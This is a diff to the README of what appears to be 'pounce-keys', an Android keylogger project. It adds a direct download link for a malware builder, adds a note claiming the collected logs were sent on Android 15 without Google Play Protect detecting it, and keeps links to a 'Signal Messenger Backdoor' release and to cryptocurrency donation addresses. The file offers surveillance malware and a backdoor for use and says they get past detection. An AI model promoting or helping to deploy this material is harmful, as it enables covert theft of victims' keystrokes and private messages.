@@ -39,7 +39,9 @@ BitCoin: 1EMZpRSBRUcbxnKfFJQ9G5bXDFNDkH7PNE
 Monero: 4A75SgESZjVbTBwKH1wVF3KMCAbHUToEk3kFrgWZ2J8K9CiSnMbQdD2fBw1BPmpHrTTh314MJ3XvkP33isWDgMFQEZuTzut
  
 # Download (JKD19 required for the new builder)
-[Builder](https://github.com/NullPounce/pounce-keys/releases/tag/PounceKey's)
+[Builder V2 direct link](https://github.com/NullPounce/pounce-keys/releases/download/PounceKey's/PounceKeysBuilder_2.0.rar)
+
+Android Studio with Google Play Protect on Android version 15 was tested without issue with sending logs or play protect.
 
 [Signal Messenger Backdoor](https://github.com/NullPounce/pounce-keys/releases/tag/Pounce-Keys-Signal)
 
